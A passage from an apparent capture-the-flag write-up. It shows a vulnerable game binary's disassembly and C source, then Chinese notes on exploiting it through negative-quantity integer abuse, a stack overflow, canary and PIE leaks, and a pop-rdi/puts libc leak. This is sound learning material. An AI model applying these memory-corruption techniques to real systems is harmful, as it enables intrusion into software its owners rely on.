    170e:	e8 ed f9 ff ff       	call   1100 <puts@plt>
    1713:	48 8d 3d 06 0b 00 00 	lea    rdi,[rip+0xb06]        # 2220 <_IO_stdin_used+0x220>
    171a:	e8 e1 f9 ff ff       	call   1100 <puts@plt>
    171f:	48 8d 3d 3a 0b 00 00 	lea    rdi,[rip+0xb3a]        # 2260 <_IO_stdin_used+0x260>
    1726:	e8 d5 f9 ff ff       	call   1100 <puts@plt>
    172b:	ba 02 00 00 00       	mov    edx,0x2
    1730:	48 8d 35 cd 09 00 00 	lea    rsi,[rip+0x9cd]        # 2104 <_IO_stdin_used+0x104>
    1737:	bf 01 00 00 00       	mov    edi,0x1
    173c:	e8 cf f9 ff ff       	call   1110 <write@plt>
    1741:	b8 00 00 00 00       	mov    eax,0x0
    1746:	e8 a3 fb ff ff       	call   12ee <read_int>
    174b:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
    174e:	83 7d f8 06          	cmp    DWORD PTR [rbp-0x8],0x6
    1752:	0f 87 5a 02 00 00    	ja     19b2 <shopping+0x321>
    1758:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
    175b:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
    1762:	00 
    1763:	48 8d 05 fa 0b 00 00 	lea    rax,[rip+0xbfa]        # 2364 <_IO_stdin_used+0x364>
    176a:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
    176d:	48 98                	cdqe   
    176f:	48 8d 15 ee 0b 00 00 	lea    rdx,[rip+0xbee]        # 2364 <_IO_stdin_used+0x364>
    1776:	48 01 d0             	add    rax,rdx
    1779:	3e ff e0             	notrack jmp rax
    177c:	48 8b 05 d5 28 00 00 	mov    rax,QWORD PTR [rip+0x28d5]        # 4058 <sc>
    1783:	48 3d 67 3c 01 00    	cmp    rax,0x13c67
    1789:	76 2f                	jbe    17ba <shopping+0x129>
    178b:	c7 05 cb 28 00 00 01 	mov    DWORD PTR [rip+0x28cb],0x1        # 4060 <fan_2x>
    1792:	00 00 00 
    1795:	48 8b 05 bc 28 00 00 	mov    rax,QWORD PTR [rip+0x28bc]        # 4058 <sc>
    179c:	48 2d 68 3c 01 00    	sub    rax,0x13c68
    17a2:	48 89 05 af 28 00 00 	mov    QWORD PTR [rip+0x28af],rax        # 4058 <sc>
    17a9:	48 8d 3d f0 0a 00 00 	lea    rdi,[rip+0xaf0]        # 22a0 <_IO_stdin_used+0x2a0>
    17b0:	e8 4b f9 ff ff       	call   1100 <puts@plt>
    17b5:	e9 05 02 00 00       	jmp    19bf <shopping+0x32e>
    17ba:	48 8d 3d eb 0a 00 00 	lea    rdi,[rip+0xaeb]        # 22ac <_IO_stdin_used+0x2ac>
    17c1:	e8 3a f9 ff ff       	call   1100 <puts@plt>
    17c6:	e9 f4 01 00 00       	jmp    19bf <shopping+0x32e>
    17cb:	48 8b 05 86 28 00 00 	mov    rax,QWORD PTR [rip+0x2886]        # 4058 <sc>
    17d2:	48 3d a9 b9 65 00    	cmp    rax,0x65b9a9
    17d8:	76 2f                	jbe    1809 <shopping+0x178>
    17da:	c7 05 80 28 00 00 01 	mov    DWORD PTR [rip+0x2880],0x1        # 4064 <fan_5x>
    17e1:	00 00 00 
    17e4:	48 8b 05 6d 28 00 00 	mov    rax,QWORD PTR [rip+0x286d]        # 4058 <sc>
    17eb:	48 2d aa b9 65 00    	sub    rax,0x65b9aa
    17f1:	48 89 05 60 28 00 00 	mov    QWORD PTR [rip+0x2860],rax        # 4058 <sc>
    17f8:	48 8d 3d a1 0a 00 00 	lea    rdi,[rip+0xaa1]        # 22a0 <_IO_stdin_used+0x2a0>
    17ff:	e8 fc f8 ff ff       	call   1100 <puts@plt>
    1804:	e9 b6 01 00 00       	jmp    19bf <shopping+0x32e>
    1809:	48 8d 3d 9c 0a 00 00 	lea    rdi,[rip+0xa9c]        # 22ac <_IO_stdin_used+0x2ac>
    1810:	e8 eb f8 ff ff       	call   1100 <puts@plt>
    1815:	e9 a5 01 00 00       	jmp    19bf <shopping+0x32e>
    181a:	48 8b 05 37 28 00 00 	mov    rax,QWORD PTR [rip+0x2837]        # 4058 <sc>
    1821:	48 3d 1f 04 a7 02    	cmp    rax,0x2a7041f
    1827:	76 2f                	jbe    1858 <shopping+0x1c7>
    1829:	c7 05 35 28 00 00 01 	mov    DWORD PTR [rip+0x2835],0x1        # 4068 <fan_10x>
    1830:	00 00 00 
    1833:	48 8b 05 1e 28 00 00 	mov    rax,QWORD PTR [rip+0x281e]        # 4058 <sc>
    183a:	48 2d 20 04 a7 02    	sub    rax,0x2a70420
    1840:	48 89 05 11 28 00 00 	mov    QWORD PTR [rip+0x2811],rax        # 4058 <sc>
    1847:	48 8d 3d 52 0a 00 00 	lea    rdi,[rip+0xa52]        # 22a0 <_IO_stdin_used+0x2a0>
    184e:	e8 ad f8 ff ff       	call   1100 <puts@plt>
    1853:	e9 67 01 00 00       	jmp    19bf <shopping+0x32e>
    1858:	48 8d 3d 4d 0a 00 00 	lea    rdi,[rip+0xa4d]        # 22ac <_IO_stdin_used+0x2ac>
    185f:	e8 9c f8 ff ff       	call   1100 <puts@plt>
    1864:	e9 56 01 00 00       	jmp    19bf <shopping+0x32e>
    1869:	48 8b 05 e8 27 00 00 	mov    rax,QWORD PTR [rip+0x27e8]        # 4058 <sc>
    1870:	48 3d ff e0 f5 05    	cmp    rax,0x5f5e0ff
    1876:	76 2f                	jbe    18a7 <shopping+0x216>
    1878:	c7 05 ea 27 00 00 01 	mov    DWORD PTR [rip+0x27ea],0x1        # 406c <fan_50x>
    187f:	00 00 00 
    1882:	48 8b 05 cf 27 00 00 	mov    rax,QWORD PTR [rip+0x27cf]        # 4058 <sc>
    1889:	48 2d 00 e1 f5 05    	sub    rax,0x5f5e100
    188f:	48 89 05 c2 27 00 00 	mov    QWORD PTR [rip+0x27c2],rax        # 4058 <sc>
    1896:	48 8d 3d 03 0a 00 00 	lea    rdi,[rip+0xa03]        # 22a0 <_IO_stdin_used+0x2a0>
    189d:	e8 5e f8 ff ff       	call   1100 <puts@plt>
    18a2:	e9 18 01 00 00       	jmp    19bf <shopping+0x32e>
    18a7:	48 8d 3d fe 09 00 00 	lea    rdi,[rip+0x9fe]        # 22ac <_IO_stdin_used+0x2ac>
    18ae:	e8 4d f8 ff ff       	call   1100 <puts@plt>
    18b3:	e9 07 01 00 00       	jmp    19bf <shopping+0x32e>
    18b8:	48 8b 05 99 27 00 00 	mov    rax,QWORD PTR [rip+0x2799]        # 4058 <sc>
    18bf:	48 ba fe e3 0b 54 02 	movabs rdx,0x2540be3fe
    18c6:	00 00 00 
    18c9:	48 39 d0             	cmp    rax,rdx
    18cc:	76 36                	jbe    1904 <shopping+0x273>
    18ce:	c7 05 98 27 00 00 01 	mov    DWORD PTR [rip+0x2798],0x1        # 4070 <fan_100x>
    18d5:	00 00 00 
    18d8:	48 8b 05 79 27 00 00 	mov    rax,QWORD PTR [rip+0x2779]        # 4058 <sc>
    18df:	48 ba 01 1c f4 ab fd 	movabs rdx,0xfffffffdabf41c01
    18e6:	ff ff ff 
    18e9:	48 01 d0             	add    rax,rdx
    18ec:	48 89 05 65 27 00 00 	mov    QWORD PTR [rip+0x2765],rax        # 4058 <sc>
    18f3:	48 8d 3d a6 09 00 00 	lea    rdi,[rip+0x9a6]        # 22a0 <_IO_stdin_used+0x2a0>
    18fa:	e8 01 f8 ff ff       	call   1100 <puts@plt>
    18ff:	e9 bb 00 00 00       	jmp    19bf <shopping+0x32e>
    1904:	48 8d 3d a1 09 00 00 	lea    rdi,[rip+0x9a1]        # 22ac <_IO_stdin_used+0x2ac>
    190b:	e8 f0 f7 ff ff       	call   1100 <puts@plt>
    1910:	e9 aa 00 00 00       	jmp    19bf <shopping+0x32e>
    1915:	48 8d 3d a1 09 00 00 	lea    rdi,[rip+0x9a1]        # 22bd <_IO_stdin_used+0x2bd>
    191c:	e8 df f7 ff ff       	call   1100 <puts@plt>
    1921:	ba 02 00 00 00       	mov    edx,0x2
    1926:	48 8d 35 d7 07 00 00 	lea    rsi,[rip+0x7d7]        # 2104 <_IO_stdin_used+0x104>
    192d:	bf 01 00 00 00       	mov    edi,0x1
    1932:	e8 d9 f7 ff ff       	call   1110 <write@plt>
    1937:	b8 00 00 00 00       	mov    eax,0x0
    193c:	e8 ad f9 ff ff       	call   12ee <read_int>
    1941:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
    1944:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    1947:	69 c0 dc 05 00 00    	imul   eax,eax,0x5dc
    194d:	48 63 d0             	movsxd rdx,eax
    1950:	48 8b 05 01 27 00 00 	mov    rax,QWORD PTR [rip+0x2701]        # 4058 <sc>
    1957:	48 39 c2             	cmp    rdx,rax
    195a:	77 48                	ja     19a4 <shopping+0x313>
    195c:	8b 15 12 27 00 00    	mov    edx,DWORD PTR [rip+0x2712]        # 4074 <stickers>
    1962:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    1965:	01 d0                	add    eax,edx
    1967:	89 05 07 27 00 00    	mov    DWORD PTR [rip+0x2707],eax        # 4074 <stickers>
    196d:	48 8b 15 e4 26 00 00 	mov    rdx,QWORD PTR [rip+0x26e4]        # 4058 <sc>
    1974:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    1977:	69 c0 dc 05 00 00    	imul   eax,eax,0x5dc
    197d:	48 98                	cdqe   
    197f:	48 29 c2             	sub    rdx,rax
    1982:	48 89 d0             	mov    rax,rdx
    1985:	48 89 05 cc 26 00 00 	mov    QWORD PTR [rip+0x26cc],rax        # 4058 <sc>
    198c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    198f:	89 c6                	mov    esi,eax
    1991:	48 8d 3d 40 09 00 00 	lea    rdi,[rip+0x940]        # 22d8 <_IO_stdin_used+0x2d8>
    1998:	b8 00 00 00 00       	mov    eax,0x0
    199d:	e8 8e f7 ff ff       	call   1130 <printf@plt>
    19a2:	eb 1b                	jmp    19bf <shopping+0x32e>
    19a4:	48 8d 3d 01 09 00 00 	lea    rdi,[rip+0x901]        # 22ac <_IO_stdin_used+0x2ac>
    19ab:	e8 50 f7 ff ff       	call   1100 <puts@plt>
    19b0:	eb 0d                	jmp    19bf <shopping+0x32e>
    19b2:	48 8d 3d 38 09 00 00 	lea    rdi,[rip+0x938]        # 22f1 <_IO_stdin_used+0x2f1>
    19b9:	e8 42 f7 ff ff       	call   1100 <puts@plt>
    19be:	90                   	nop
    19bf:	e9 a9 00 00 00       	jmp    1a6d <shopping+0x3dc>
    19c4:	80 7d f3 53          	cmp    BYTE PTR [rbp-0xd],0x53
    19c8:	74 0a                	je     19d4 <shopping+0x343>
    19ca:	80 7d f3 73          	cmp    BYTE PTR [rbp-0xd],0x73
    19ce:	0f 85 8c 00 00 00    	jne    1a60 <shopping+0x3cf>
    19d4:	48 8d 3d 2d 09 00 00 	lea    rdi,[rip+0x92d]        # 2308 <_IO_stdin_used+0x308>
    19db:	e8 20 f7 ff ff       	call   1100 <puts@plt>
    19e0:	ba 02 00 00 00       	mov    edx,0x2
    19e5:	48 8d 35 18 07 00 00 	lea    rsi,[rip+0x718]        # 2104 <_IO_stdin_used+0x104>
    19ec:	bf 01 00 00 00       	mov    edi,0x1
    19f1:	e8 1a f7 ff ff       	call   1110 <write@plt>
    19f6:	b8 00 00 00 00       	mov    eax,0x0
    19fb:	e8 ee f8 ff ff       	call   12ee <read_int>
    1a00:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
    1a03:	8b 05 6b 26 00 00    	mov    eax,DWORD PTR [rip+0x266b]        # 4074 <stickers>
    1a09:	39 45 f4             	cmp    DWORD PTR [rbp-0xc],eax
    1a0c:	7f 44                	jg     1a52 <shopping+0x3c1>
    1a0e:	8b 05 60 26 00 00    	mov    eax,DWORD PTR [rip+0x2660]        # 4074 <stickers>
    1a14:	2b 45 f4             	sub    eax,DWORD PTR [rbp-0xc]
    1a17:	89 05 57 26 00 00    	mov    DWORD PTR [rip+0x2657],eax        # 4074 <stickers>
    1a1d:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    1a20:	69 c0 e8 03 00 00    	imul   eax,eax,0x3e8
    1a26:	48 63 d0             	movsxd rdx,eax
    1a29:	48 8b 05 28 26 00 00 	mov    rax,QWORD PTR [rip+0x2628]        # 4058 <sc>
    1a30:	48 01 d0             	add    rax,rdx
    1a33:	48 89 05 1e 26 00 00 	mov    QWORD PTR [rip+0x261e],rax        # 4058 <sc>
    1a3a:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    1a3d:	89 c6                	mov    esi,eax
    1a3f:	48 8d 3d ea 08 00 00 	lea    rdi,[rip+0x8ea]        # 2330 <_IO_stdin_used+0x330>
    1a46:	b8 00 00 00 00       	mov    eax,0x0
    1a4b:	e8 e0 f6 ff ff       	call   1130 <printf@plt>
    1a50:	eb 1b                	jmp    1a6d <shopping+0x3dc>
    1a52:	48 8d 3d f1 08 00 00 	lea    rdi,[rip+0x8f1]        # 234a <_IO_stdin_used+0x34a>
    1a59:	e8 a2 f6 ff ff       	call   1100 <puts@plt>
    1a5e:	eb 0d                	jmp    1a6d <shopping+0x3dc>
    1a60:	48 8d 3d 8a 08 00 00 	lea    rdi,[rip+0x88a]        # 22f1 <_IO_stdin_used+0x2f1>
    1a67:	e8 94 f6 ff ff       	call   1100 <puts@plt>
    1a6c:	90                   	nop
    1a6d:	90                   	nop
    1a6e:	c9                   	leave  
    1a6f:	c3                   	ret    

0000000000001a70 <set_fan_name>:
    1a70:	f3 0f 1e fa          	endbr64 
    1a74:	55                   	push   rbp
    1a75:	48 89 e5             	mov    rbp,rsp
    1a78:	48 83 ec 40          	sub    rsp,0x40
    1a7c:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1a83:	00 00 
    1a85:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1a89:	31 c0                	xor    eax,eax
    1a8b:	48 8b 05 be 25 00 00 	mov    rax,QWORD PTR [rip+0x25be]        # 4050 <fans>
    1a92:	48 3d 7f 96 98 00    	cmp    rax,0x98967f
    1a98:	0f 86 b3 00 00 00    	jbe    1b51 <set_fan_name+0xe1>
    1a9e:	8b 05 d0 25 00 00    	mov    eax,DWORD PTR [rip+0x25d0]        # 4074 <stickers>
    1aa4:	3d c7 00 00 00       	cmp    eax,0xc7
    1aa9:	0f 8e a2 00 00 00    	jle    1b51 <set_fan_name+0xe1>
    1aaf:	c6 45 cf 00          	mov    BYTE PTR [rbp-0x31],0x0
    1ab3:	48 8d 3d c6 08 00 00 	lea    rdi,[rip+0x8c6]        # 2380 <_IO_stdin_used+0x380>
    1aba:	e8 41 f6 ff ff       	call   1100 <puts@plt>
    1abf:	ba 02 00 00 00       	mov    edx,0x2
    1ac4:	48 8d 35 39 06 00 00 	lea    rsi,[rip+0x639]        # 2104 <_IO_stdin_used+0x104>
    1acb:	bf 01 00 00 00       	mov    edi,0x1
    1ad0:	e8 3b f6 ff ff       	call   1110 <write@plt>
    1ad5:	48 8b 05 74 25 00 00 	mov    rax,QWORD PTR [rip+0x2574]        # 4050 <fans>
    1adc:	48 c1 e8 07          	shr    rax,0x7
    1ae0:	48 ba 11 1e 6d 1c b1 	movabs rdx,0x29f16b11c6d1e11
    1ae7:	16 9f 02 
    1aea:	48 f7 e2             	mul    rdx
    1aed:	48 c1 ea 05          	shr    rdx,0x5
    1af1:	48 8d 45 d0          	lea    rax,[rbp-0x30]
    1af5:	48 89 c6             	mov    rsi,rax
    1af8:	bf 00 00 00 00       	mov    edi,0x0
    1afd:	e8 3e f6 ff ff       	call   1140 <read@plt>
    1b02:	48 8d 45 d0          	lea    rax,[rbp-0x30]
    1b06:	48 89 c6             	mov    rsi,rax
    1b09:	48 8d 3d 85 08 00 00 	lea    rdi,[rip+0x885]        # 2395 <_IO_stdin_used+0x395>
    1b10:	b8 00 00 00 00       	mov    eax,0x0
    1b15:	e8 16 f6 ff ff       	call   1130 <printf@plt>
    1b1a:	e8 31 f6 ff ff       	call   1150 <getchar@plt>
    1b1f:	88 45 cf             	mov    BYTE PTR [rbp-0x31],al
    1b22:	80 7d cf 59          	cmp    BYTE PTR [rbp-0x31],0x59
    1b26:	74 08                	je     1b30 <set_fan_name+0xc0>
    1b28:	80 7d cf 79          	cmp    BYTE PTR [rbp-0x31],0x79
    1b2c:	74 02                	je     1b30 <set_fan_name+0xc0>
    1b2e:	eb 83                	jmp    1ab3 <set_fan_name+0x43>
    1b30:	48 8d 45 d0          	lea    rax,[rbp-0x30]
    1b34:	48 89 c6             	mov    rsi,rax
    1b37:	48 8d 3d 62 25 00 00 	lea    rdi,[rip+0x2562]        # 40a0 <fan_name>
    1b3e:	e8 ad f5 ff ff       	call   10f0 <strcpy@plt>
    1b43:	48 8d 3d 66 08 00 00 	lea    rdi,[rip+0x866]        # 23b0 <_IO_stdin_used+0x3b0>
    1b4a:	e8 b1 f5 ff ff       	call   1100 <puts@plt>
    1b4f:	eb 0c                	jmp    1b5d <set_fan_name+0xed>
    1b51:	48 8d 3d 70 08 00 00 	lea    rdi,[rip+0x870]        # 23c8 <_IO_stdin_used+0x3c8>
    1b58:	e8 a3 f5 ff ff       	call   1100 <puts@plt>
    1b5d:	90                   	nop
    1b5e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1b62:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    1b69:	00 00 
    1b6b:	74 05                	je     1b72 <set_fan_name+0x102>
    1b6d:	e8 ae f5 ff ff       	call   1120 <__stack_chk_fail@plt>
    1b72:	c9                   	leave  
    1b73:	c3                   	ret    

0000000000001b74 <main>:
    1b74:	f3 0f 1e fa          	endbr64 
    1b78:	55                   	push   rbp
    1b79:	48 89 e5             	mov    rbp,rsp
    1b7c:	48 83 ec 10          	sub    rsp,0x10
    1b80:	b8 00 00 00 00       	mov    eax,0x0
    1b85:	e8 ff f6 ff ff       	call   1289 <init>
    1b8a:	48 8d 3d 7f 08 00 00 	lea    rdi,[rip+0x87f]        # 2410 <_IO_stdin_used+0x410>
    1b91:	e8 6a f5 ff ff       	call   1100 <puts@plt>
    1b96:	ba 06 00 00 00       	mov    edx,0x6
    1b9b:	48 8d 35 ad 08 00 00 	lea    rsi,[rip+0x8ad]        # 244f <_IO_stdin_used+0x44f>
    1ba2:	bf 01 00 00 00       	mov    edi,0x1
    1ba7:	e8 64 f5 ff ff       	call   1110 <write@plt>
    1bac:	ba 20 00 00 00       	mov    edx,0x20
    1bb1:	48 8d 35 c8 24 00 00 	lea    rsi,[rip+0x24c8]        # 4080 <name>
    1bb8:	bf 00 00 00 00       	mov    edi,0x0
    1bbd:	e8 7e f5 ff ff       	call   1140 <read@plt>
    1bc2:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
    1bc9:	b8 00 00 00 00       	mov    eax,0x0
    1bce:	e8 6e f7 ff ff       	call   1341 <menu>
    1bd3:	b8 00 00 00 00       	mov    eax,0x0
    1bd8:	e8 11 f7 ff ff       	call   12ee <read_int>
    1bdd:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
    1be0:	83 7d fc 04          	cmp    DWORD PTR [rbp-0x4],0x4
    1be4:	74 44                	je     1c2a <main+0xb6>
    1be6:	83 7d fc 04          	cmp    DWORD PTR [rbp-0x4],0x4
    1bea:	7f 54                	jg     1c40 <main+0xcc>
    1bec:	83 7d fc 03          	cmp    DWORD PTR [rbp-0x4],0x3
    1bf0:	74 2c                	je     1c1e <main+0xaa>
    1bf2:	83 7d fc 03          	cmp    DWORD PTR [rbp-0x4],0x3
    1bf6:	7f 48                	jg     1c40 <main+0xcc>
    1bf8:	83 7d fc 01          	cmp    DWORD PTR [rbp-0x4],0x1
    1bfc:	74 08                	je     1c06 <main+0x92>
    1bfe:	83 7d fc 02          	cmp    DWORD PTR [rbp-0x4],0x2
    1c02:	74 0e                	je     1c12 <main+0x9e>
    1c04:	eb 3a                	jmp    1c40 <main+0xcc>
    1c06:	b8 00 00 00 00       	mov    eax,0x0
    1c0b:	e8 ff f8 ff ff       	call   150f <stream>
    1c10:	eb 3b                	jmp    1c4d <main+0xd9>
    1c12:	b8 00 00 00 00       	mov    eax,0x0
    1c17:	e8 75 fa ff ff       	call   1691 <shopping>
    1c1c:	eb 2f                	jmp    1c4d <main+0xd9>
    1c1e:	b8 00 00 00 00       	mov    eax,0x0
    1c23:	e8 48 fe ff ff       	call   1a70 <set_fan_name>
    1c28:	eb 23                	jmp    1c4d <main+0xd9>
    1c2a:	48 8d 3d 25 08 00 00 	lea    rdi,[rip+0x825]        # 2456 <_IO_stdin_used+0x456>
    1c31:	e8 ca f4 ff ff       	call   1100 <puts@plt>
    1c36:	bf 00 00 00 00       	mov    edi,0x0
    1c3b:	e8 40 f5 ff ff       	call   1180 <exit@plt>
    1c40:	48 8d 3d 14 08 00 00 	lea    rdi,[rip+0x814]        # 245b <_IO_stdin_used+0x45b>
    1c47:	e8 b4 f4 ff ff       	call   1100 <puts@plt>
    1c4c:	90                   	nop
    1c4d:	e9 77 ff ff ff       	jmp    1bc9 <main+0x55>
    1c52:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
    1c59:	00 00 00 
    1c5c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000001c60 <__libc_csu_init>:
    1c60:	f3 0f 1e fa          	endbr64 
    1c64:	41 57                	push   r15
    1c66:	4c 8d 3d fb 20 00 00 	lea    r15,[rip+0x20fb]        # 3d68 <__frame_dummy_init_array_entry>
    1c6d:	41 56                	push   r14
    1c6f:	49 89 d6             	mov    r14,rdx
    1c72:	41 55                	push   r13
    1c74:	49 89 f5             	mov    r13,rsi
    1c77:	41 54                	push   r12
    1c79:	41 89 fc             	mov    r12d,edi
    1c7c:	55                   	push   rbp
    1c7d:	48 8d 2d ec 20 00 00 	lea    rbp,[rip+0x20ec]        # 3d70 <__do_global_dtors_aux_fini_array_entry>
    1c84:	53                   	push   rbx
    1c85:	4c 29 fd             	sub    rbp,r15
    1c88:	48 83 ec 08          	sub    rsp,0x8
    1c8c:	e8 6f f3 ff ff       	call   1000 <_init>
    1c91:	48 c1 fd 03          	sar    rbp,0x3
    1c95:	74 1f                	je     1cb6 <__libc_csu_init+0x56>
    1c97:	31 db                	xor    ebx,ebx
    1c99:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    1ca0:	4c 89 f2             	mov    rdx,r14
    1ca3:	4c 89 ee             	mov    rsi,r13
    1ca6:	44 89 e7             	mov    edi,r12d
    1ca9:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
    1cad:	48 83 c3 01          	add    rbx,0x1
    1cb1:	48 39 dd             	cmp    rbp,rbx
    1cb4:	75 ea                	jne    1ca0 <__libc_csu_init+0x40>
    1cb6:	48 83 c4 08          	add    rsp,0x8
    1cba:	5b                   	pop    rbx
    1cbb:	5d                   	pop    rbp
    1cbc:	41 5c                	pop    r12
    1cbe:	41 5d                	pop    r13
    1cc0:	41 5e                	pop    r14
    1cc2:	41 5f                	pop    r15
    1cc4:	c3                   	ret    
    1cc5:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
    1ccc:	00 00 00 00 

0000000000001cd0 <__libc_csu_fini>:
    1cd0:	f3 0f 1e fa          	endbr64 
    1cd4:	c3                   	ret    

Disassembly of section .fini:

0000000000001cd8 <_fini>:
    1cd8:	f3 0f 1e fa          	endbr64 
    1cdc:	48 83 ec 08          	sub    rsp,0x8
    1ce0:	48 83 c4 08          	add    rsp,0x8
    1ce4:	c3                   	ret    

```

</details>

<details>
<summary>hint code</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char name[0x20];
char fan_name[0x20];
unsigned long long fans = 0;
unsigned long long sc = 0;
int fan_2x = 0;
int fan_5x = 0;
int fan_10x = 0;
int fan_50x = 0;
int fan_100x = 0;
int stickers = 0;

void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int read_int()
{
    char buf[0x10];
    read(0, buf, 0x10);
    return atoi(buf);
}

void menu()
{
    puts("======== VT ========");
    printf("name: %s\n", name);
    printf("fans: %llu\n", fans);
    printf("sc: %llu\n", sc);
    printf("number of stickers: %d\n", stickers);
    printf("[2x fan %s]\n", fan_2x ? "on" : "off");
    printf("[5x fan %s]\n", fan_5x ? "on" : "off");
    printf("[10x fan %s]\n", fan_10x ? "on" : "off");
    printf("[50x fan %s]\n", fan_50x ? "on" : "off");
    printf("[100x fan %s]\n", fan_100x ? "on" : "off");
    puts("====================");
    puts("");
    puts("What do you want to do?");
    puts("1. start stream");
    puts("2. shopping");
    puts("3. set fans name");
    puts("4. exit");
    write(1, "> ", 2);
}

void stream()
{
    unsigned long long fan_add = 100;
    if (fan_2x)
    {
        fan_add *= 2;
    }
    if (fan_5x)
    {
        fan_add *= 5;
    }
    if (fan_10x)
    {
        fan_add *= 10;
    }
    if (fan_50x)
    {
        fan_add *= 50;
    }
    if (fan_100x)
    {
        fan_add *= 100;
    }
    puts("Start streaming...");
    sleep(1);
    fans += fan_add;
    if (stickers)
    {
        sc += 1000 * stickers * 1.5;
    }
    else
    {
        sc += 1000;
    }
}

void shopping()
{
    char c;
    puts("Buy or Sell (B/S)");
    write(1, "> ", 2);
    c = getchar();
    if (c == 'B' || c == 'b')
    {
        puts("Which one to buy?");
        puts("1. fans number 2x every stream -- price: 81000 sc");
        puts("2. fans number 5x every stream -- price: 6666666 sc");
        puts("3. fans number 10x every stream -- price: 44500000 sc");
        puts("4. fans number 50x every stream -- price: 100000000 sc");
        puts("5. fans number 100x every stream -- price: 9999999999 sc");
        puts("6. membership stickers (one stickers sc 1.5x) -- price: 1500 sc");

        write(1, "> ", 2);
        int choice = read_int();
        switch (choice)
        {
        case 1:
            if (sc >= 81000)
            {
                fan_2x = 1;
                sc -= 81000;
                puts("buy success");
            }
            else
            {
                puts("you need more sc");
            }
            break;
        case 2:
            if (sc >= 6666666)
            {
                fan_5x = 1;
                sc -= 6666666;
                puts("buy success");
            }
            else
            {
                puts("you need more sc");
            }
            break;
        case 3:
            if (sc >= 44500000)
            {
                fan_10x = 1;
                sc -= 44500000;
                puts("buy success");
            }
            else
            {
                puts("you need more sc");
            }
            break;
        case 4:
            if (sc >= 100000000)
            {
                fan_50x = 1;
                sc -= 100000000;
                puts("buy success");
            }
            else
            {
                puts("you need more sc");
            }
            break;
        case 5:
            if (sc >= 9999999999)
            {
                fan_100x = 1;
                sc -= 9999999999;
                puts("buy success");
            }
            else
            {
                puts("you need more sc");
            }
            break;
        case 6:
            puts("How many stickers to buy? ");
            write(1, "> ", 2);
            int num = read_int();
            if (sc >= (1500 * num))
            {
                stickers += num;
                sc -= (1500 * num);
                printf("buy %d stickers success\n", num);
            }
            else
            {
                puts("you need more sc");
            }
            break;
        default:
            puts("Invalid operation!!");
            break;
        }
    }
    else if (c == 'S' || c == 's')
    {
        puts("How many stickers do you want to sell? ");
        write(1, "> ", 2);
        int num = read_int();
        if (stickers >= num)
        {
            stickers -= num;
            sc += num * 1000;
            printf("sell %d stickers success\n", num);
        }
        else
        {
            puts("Invalid num of stickers");
        }
    }
    else
    {
        puts("Invalid operation!!");
    }
}

void set_fan_name()
{
    if (fans >= 10000000 && stickers >= 200)
    {
        char buf[0x20];
        char y = '\0';

        while (1)
        {
            puts("Enter your fans name");
            write(1, "> ", 2);
            read(0, buf, (fans / 400000));
            printf("Set fans name to %s (Y/N)\n", buf);
            y = getchar();
            if (y == 'Y' || y == 'y')
            {
                break;
            }
        }

        strcpy(fan_name, buf);
        puts("Set fans name success");
    }
    else
    {
        puts("Only who has fans over 10M and stickers over 200 can set fans name");
    }
}

int main()
{
    init();
    puts("Today is your debut enter your name and start your vTuber life");
    write(1, "name: ", 6);
    read(0, name, 0x20);

    int choice = 0;
    while (1)
    {
        menu();
        choice = read_int();
        switch (choice)
        {
        case 1:
            stream();
            break;
        case 2:
            shopping();
            break;
        case 3:
            set_fan_name();
            break;
        case 4:
            puts("bye~");
            exit(0);
            break;
        default:
            puts("Invalid argument!!");
            break;
        }
    }

    return 0;
}
```
</details>


**key concept :** <font color = #FF0080 > Canary、 PIE </font>

**突破點 :** 

1. 同樣要進行 buffer overflow，這次目標放在 set_fan_name()，因為這裡是唯一	read參數可以超過0x10位的地方。因為有 timeout 限制，我們必須要快速發大財，這邊利用shopping() 的漏洞，販賣負的stickers直接發財，然後把粉絲加成	都買一買，最後只要stream一次就能滿足set_fan_name的條件。

2. 成功進入set_fan_name() 後，我們共要處理三個問題：

        (1) Canary 防禦機制
        (2) PIE 防禦機制 Code 端
        (3) PIE 防禦機制	Libc 端

3. 在程式裡我最先做的是第二項，原因是我發現輸入的+0x8處，剛好有個位於 Code端			的pointer，所以我就將input塞	8個垃圾，讓兩者接起來，這樣後面的名稱確認			那就會把Code端位置洩漏出來，由此得到Code端的浮動位置。
4. 第二個做的是第一項，破解Canary的方式與上方相同，我塞41個垃圾讓Canary洩			漏出來，雖然Canary的第一個字元	會被我垃圾蓋掉，但是Canary的第一個字元固			定是b”\x00”，所以後面再補給他就是了。
5. 最後算的是Libc的浮動位置，這裡的方法就沒有什麼特殊的，因為我們在前面已經獲			得Code端的浮動位置，所以我們已經可以開始控制 ret 來搞事了，我們用了 pop 			rdi塞入Libc puts的位置，然後呼叫 Code端的puts 讓他輸出出來，這樣得到了			Libc端的浮動位置。
